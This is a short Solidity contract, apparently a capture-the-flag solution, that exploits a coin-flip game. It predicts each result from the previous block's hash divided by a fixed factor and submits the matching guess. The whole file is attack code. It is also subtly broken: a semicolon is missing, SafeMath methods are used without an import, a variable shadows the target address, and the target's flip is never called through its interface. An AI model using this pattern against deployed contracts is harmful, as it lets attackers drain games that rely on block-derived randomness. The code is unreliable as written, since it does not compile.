// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ICoinFlip {
  function flip(bool _guess) public returns (bool);
}

contract HackCoinFlip {
    bool public side;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlip;

    constructor(address _coinFlip) public {
      coinFlip = _coinFlip
    }

    function hack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        side = coinFlip == 1 ? true : false;
        flip(side);
    }
}
